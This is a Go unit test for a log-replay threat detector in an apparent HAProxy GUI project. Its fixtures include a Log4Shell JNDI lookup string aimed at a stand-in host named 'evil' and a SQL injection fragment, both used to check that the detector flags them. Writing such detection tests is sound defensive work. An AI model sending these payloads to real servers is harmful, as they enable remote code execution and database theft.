package security

import (
	"testing"
	"time"

	"haproxy-gui/internal/haproxylog"
)

func TestReplay_FindsAttacksInOrderIndependentOfInputOrder(t *testing.T) {
	base := time.Date(2026, 10, 14, 9, 0, 0, 0, time.Local)
	mk := func(ip, target string, at time.Time) haproxylog.Line {
		l := ctiLine(ip, target)
		l.Time = at
		return l
	}
	lines := []haproxylog.Line{
		mk("9.9.9.9", "/?x=${jndi:ldap://evil/a}", base.Add(5*time.Minute)),
		mk("8.8.8.8", "/index.html", base),
		mk("9.9.9.9", "/?q=1+union+select+1", base.Add(time.Minute)),
		{ClientIP: "7.7.7.7", Method: "GET", Path: "/untimed", Target: "/?x=${jndi:ldap://e/a}"}, // no timestamp: skipped
	}

	dets := Replay(lines, DefaultThresholds())
	var critical, high int
	for _, d := range dets {
		if d.Subject == "7.7.7.7" || d.Subject == "8.8.8.8" {
			t.Errorf("unexpected detection for %s: %+v", d.Subject, d)
		}
		if d.Rule == RuleThreatIntel && d.Severity == SeverityCritical {
			critical++
		}
		if d.Rule == RuleThreatIntel && d.Severity == SeverityHigh {
			high++
		}
	}
	if critical != 1 || high != 1 {
		t.Errorf("critical=%d high=%d, want the Log4Shell and the SQLi detection: %+v", critical, high, dets)
	}
}

func TestReplay_EmptyInput(t *testing.T) {
	if got := Replay(nil, DefaultThresholds()); len(got) != 0 {
		t.Errorf("got %+v", got)
	}
}
